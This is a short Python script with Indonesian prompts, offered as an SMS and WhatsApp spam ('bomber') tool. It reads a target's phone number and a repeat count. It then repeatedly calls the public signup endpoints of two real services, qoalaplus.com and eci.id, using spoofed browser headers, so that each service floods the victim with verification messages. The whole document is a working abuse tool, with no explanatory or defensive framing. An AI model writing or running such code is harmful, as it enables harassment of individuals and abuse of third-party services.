import requests,json,os

def menu():
   print("[1] SPAM WA (4 KALI SEHARI)")
   print("[2] SPAM SMS (UNLIMITED)")
   men = input("MASUKKAN PILIHAN -> ")
   if men == '1':
		   wa()
   elif men == '2':
  	   sms()
   else:
  	  exit()
	
def wa():
   i = 0
   os.system("clear")
   print("SPAM WHATSAPP (MAX 4 KALI SEHARI)")
   print("")
   no = input("nomer target : ")
   jum = int(input("jumlah spam  : "))
   for i in range(jum):
     i += 1
     head = {
       "Host": "api.qoalaplus.com",
       "Connection": "keep-alive",
       "Content-Length": "53",
       "Accept": "application/json, text/plain, */*",
       "User-Agent": "Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/105.0.5195.136 Mobile Safari/537.36",
       "Content-Type": "application/json",
       "Origin": "https://www.qoalaplus.com",
       "X-Requested-With": "com.xbrowser.play",
       "Sec-Fetch-Site": "same-site",
       "Sec-Fetch-Mode": "cors",
       "Sec-Fetch-Dest": "empty",
       "Referer": "https://www.qoalaplus.com/",
       "Accept-Encoding": "gzip, deflate",
       "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
     data = json.dumps({"phone_number":"+62"+no,"channel":"WA"})
     pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
     if "success" in pos:
    	 print("sukses",i)
     else:
        	print("gagal",i)
    	
def sms():
  i = 0
  os.system("clear")
  print("Spam Sms Unlimited ( Tak Terbatas )")
  nomer = input("Masukan Nomer Target > ")
  jumlah = int(input("Masukan Jumlah Spam > "))
  for i in range(jumlah):
     i += 1
     headers = {
        "Host": "eci.id",
        "Connection": "keep-alive",
        "Content-Length": "27",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://eci.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://eci.id/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
     data = json.dumps({"identity":"0"+nomer})   
     pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text
  if "success" in pos:
      print("sukses",i)
  else:
       print("gagal",i)
os.system("clear")       
menu()